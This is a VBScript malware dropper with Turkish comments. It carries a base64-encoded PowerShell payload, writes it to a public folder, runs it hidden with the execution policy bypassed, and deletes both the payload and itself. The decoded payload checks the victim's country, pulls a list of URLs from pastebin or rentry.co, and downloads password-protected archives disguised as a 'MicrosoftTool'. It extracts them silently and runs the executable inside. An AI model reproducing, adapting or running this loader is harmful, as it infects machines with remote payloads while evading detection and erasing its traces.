base64Data = "ZnVuY3Rpb24gRG93bmxvYWQtRmlsZXMoJHVybHMpeyRwcm9ncmFtRGF0YVBhdGg9IkM6XFByb2dyYW1EYXRhIjskdGVtcEZpbGVOYW1lPUpvaW4tUGF0aCAkcHJvZ3JhbURhdGFQYXRoICI3enIuZXhlIjskdXJsRm9yN3pyPSJodHRwczovL3d3dy43LXppcC5vcmcvYS83enIuZXhlIjt0cnl7JHdlYkNsaWVudD1OZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyR3ZWJDbGllbnQuRG93bmxvYWRGaWxlKCR1cmxGb3I3enIsJHRlbXBGaWxlTmFtZSl9Y2F0Y2h7cmV0dXJufWZvcmVhY2goJHVybDEgaW4gJHVybHMpe3RyeXskcmFuZFN0cmluZz0iTWljcm9zb2Z0VG9vbCI7JGZpbGVQYXRoPUpvaW4tUGF0aCAkcHJvZ3JhbURhdGFQYXRoICIkcmFuZFN0cmluZy43eiI7JHdlYkNsaWVudC5Eb3dubG9hZEZpbGUoJHVybDEsJGZpbGVQYXRoKTskZXh0cmFjdFBhdGg9Sm9pbi1QYXRoICRwcm9ncmFtRGF0YVBhdGggJHJhbmRTdHJpbmc7JHBzaT1OZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvOyRwc2kuRmlsZU5hbWU9IiRwcm9ncmFtRGF0YVBhdGhcN3pyLmV4ZSI7JHBzaS5Bcmd1bWVudHM9InggYCIkZmlsZVBhdGhgIiAtb2AiJGV4dHJhY3RQYXRoYCIgLXBRQVNJTUAjJlNPTUFMSS4uQCMmIyE0IjskcHNpLkNyZWF0ZU5vV2luZG93PSR0cnVlOyRwc2kuVXNlU2hlbGxFeGVjdXRlPSRmYWxzZTskcHJvY2Vzcz1bU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkcHNpKTskcHJvY2Vzcy5XYWl0Rm9yRXhpdCgpfWNhdGNoe319UmVtb3ZlLUl0ZW0gJHRlbXBGaWxlTmFtZTtSZW1vdmUtSXRlbSAiJHByb2dyYW1EYXRhUGF0aFwqLjd6IjskZXhlY3V0YWJsZVBhdGg9Sm9pbi1QYXRoICRwcm9ncmFtRGF0YVBhdGggIk1pY3Jvc29mdFRvb2xcY3VycmVudFxNaWNyb3NvZnQuZXhlIjtTdGFydC1Qcm9jZXNzICRleGVjdXRhYmxlUGF0aH10cnl7ZnVuY3Rpb24gR2V0LUNvdW50cnl7JGlwSW5mbz1JbnZva2UtUmVzdE1ldGhvZCAtVXJpICJodHRwOi8vaXAtYXBpLmNvbS9qc29uIjtyZXR1cm4gJGlwSW5mby5jb3VudHJ5Q29kZX0kY291bnRyeT0oR2V0LUNvdW50cnkpLlRyaW0oKTskYm9keTE9aWYoJGNvdW50cnkgLWVxICJSVSIpe0ludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy93dkFTZ0QyQyJ9ZWxzZXtJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwczovL3JlbnRyeS5jby9NdWNrTU1DL3JhdyJ9OyR1cmxzPSRib2R5MS5Db250ZW50IC1zcGxpdCAiYG4ifEZvckVhY2gtT2JqZWN0IHsgJF8uVHJpbSgpIH07RG93bmxvYWQtRmlsZXMgJHVybHN9Y2F0Y2h7fQ==" ' Base64 kodlanmış veri buraya eklenecek

Set base64Decoder = CreateObject("MSXml2.DOMDocument.6.0").createElement("base64")
base64Decoder.DataType = "bin.base64"
base64Decoder.Text = base64Data
decodedData = base64Decoder.NodeTypedValue
outputFile = "C:\Users\Public\Documents\decode.ps1"

Set fso = CreateObject("Scripting.FileSystemObject")
Set outFile = fso.CreateTextFile(outputFile, True)
outFile.Write BinaryToString(decodedData)
outFile.Close

Set shell = CreateObject("WScript.Shell")
shell.Run "powershell.exe -ExecutionPolicy Bypass -File " & outputFile, 0, True

fso.DeleteFile outputFile

' Kendisini imha etme
fso.DeleteFile WScript.ScriptFullName

Function BinaryToString(Binary)
    ' Binary veriyi stringe dönüştürme
    Dim RS, L
    Set RS = CreateObject("ADODB.Recordset")
    L = LenB(Binary)
    If L > 0 Then
        RS.Fields.Append "m", 201, L
        RS.Open
        RS.AddNew
        RS("m").AppendChunk Binary
        RS.Update
        BinaryToString = RS("m").GetChunk(L)
    Else
        BinaryToString = ""
    End If
End Function